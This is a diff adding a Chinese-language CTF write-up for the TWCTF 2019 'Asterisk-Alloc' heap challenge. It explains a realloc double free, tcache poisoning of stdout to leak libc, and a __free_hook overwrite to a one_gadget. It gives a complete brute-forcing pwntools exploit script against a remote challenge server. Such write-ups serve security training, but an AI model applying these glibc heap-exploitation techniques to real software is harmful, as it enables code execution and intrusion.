@@ -220,4 +220,106 @@ icon: icon-html
   main()
   ```
 
+* ### Asterisk-Alloc
+
+  malloc、calloc、relloc，除了relloc其他的只能用一次
+
+  calloc不使用tcache，没什么用
+
+  ```c
+  unsigned __int64 call_realloc()
+  {
+    size_t v0; // rsi
+    size_t size; // [rsp+0h] [rbp-10h]
+    unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+  
+    v3 = __readfsqword(0x28u);
+    printf("Size: ");
+    __isoc99_scanf("%ld", &size);
+    getchar();
+    v0 = size;
+    ptr_r = realloc(ptr_r, size);
+    printf("Data: ", v0);
+    read(0, ptr_r, size);
+    return __readfsqword(0x28u) ^ v3;
+  }
+  ```
+
+  relloc(ptr,size)，若ptr为NULL，将调用__libc_malloc，相当于malloc
+
+  size给一个负数，realloc执行失败，返回NULL，这样就得到了为NULL的ptr
+
+  存在double free，基本操作，先free一波搞进unsorted bin，然后爆破两字节tcache attack打到stdout，泄露libc，然后改free_hook
+
+  ```python
+  from pwn import *
+  #r = remote('node2.buuoj.cn.wetolink.com',28167)
+  #r = process('./TWCTF_online_2019_asterisk_alloc')
+  elf = ELF('./TWCTF_online_2019_asterisk_alloc')
+  libc = ELF('./libc.so.6')
+  
+  def realloc(size,content):
+      r.sendlineafter(':','3')
+      r.sendlineafter(':',str(size))
+      if size > 0:
+          r.sendafter(': ',content)
+  
+  def malloc(size,content):
+      r.sendlineafter(':','1')
+      r.sendlineafter(':',str(size))
+      r.sendafter(':',content)
+  
+  def calloc(size,content):
+      r.sendlineafter(':','2')
+      r.sendlineafter(':',str(size))
+      r.sendafter(':',content)
+  
+  def free(which):
+      r.sendlineafter(':','4')
+      r.sendlineafter(':',which)
+  while True:
+  	try:
+  		r = remote('node2.buuoj.cn.wetolink.com',28167)
+  		malloc(0x90,'fuck')
+  		realloc(0x90,'fuck')
+  		free('r')
+  		free('r')
+  		free('r')
+  		free('r')
+  		free('r')
+  		free('r')
+  		free('r')
+  		free('r')
+  		realloc(0x90,p16(0xc760))
+  		realloc(-1,'')
+  		realloc(0x90,p16(0xc760))
+  		realloc(-1,'')
+  		realloc(0x90,p64(0xfbad1800)+'\x00'*0x19)
+  		r.recvuntil('Size: Data: ')
+  		fuck = r.recvuntil('=')
+  		log.info(fuck)
+  		libc_base = u64(fuck[8:16])-0x3ed8b0
+  		log.success('libc_base:'+hex(libc_base))
+  		fuck_addr = libc_base+0x3ed8e8
+  		one = libc_base+0x4f322
+  		log.success('fuck_addr:'+hex(fuck_addr))
+  		log.success('one:'+hex(one))
+  
+  		free('m')
+  		realloc(-1,'')
+  		realloc(0x90,'fuck')
+  		free('r')
+  		realloc(0x90,p64(fuck_addr))
+  		realloc(-1,'')
+  		realloc(0x90,'fuck')
+  		realloc(-1,'')
+  		realloc(0x90,p64(one))
+  		free('m')
+  		r.interactive()
+  	except:
+  		continue
+  
+  ```
+  
+  
   
